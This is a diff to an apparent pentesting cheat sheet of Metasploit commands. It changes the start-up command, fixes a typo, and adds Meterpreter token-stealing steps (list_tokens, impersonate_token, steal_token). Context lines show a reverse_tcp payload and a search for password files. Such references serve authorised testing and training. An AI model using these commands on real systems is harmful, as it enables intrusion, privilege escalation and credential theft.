@@ -64,7 +64,7 @@ nmap
 
 Metaslpoit
    	Statring metasploit
-    *$ service postgesql start && service metasploit start*
+    *$ service postgesql start; update-rc.d postgresql enable; msfconsole; db_rebuild_cache*
     MSFconsole
         Entry point for the framework
         *$ msfconsole*
@@ -115,7 +115,7 @@ Metaslpoit
         Listen for a reverse shell:
         *> set PAYLOAD windows/meterpreter/reverse_tcp*
         Put session in background:
-        *> backgound*
+        *> background*
         List sessions
         *> sessions -l*
         Switch to session
@@ -123,6 +123,9 @@ Metaslpoit
         Token stealing
         *> use incognito
         >list_tokens -u*
+        >impersonate_token BOB\IWAM_BOB
+        >ps
+        >steal_token [PID]
         Search files:
         *> meterpeter search -f *pass*.txt*
         Upload files
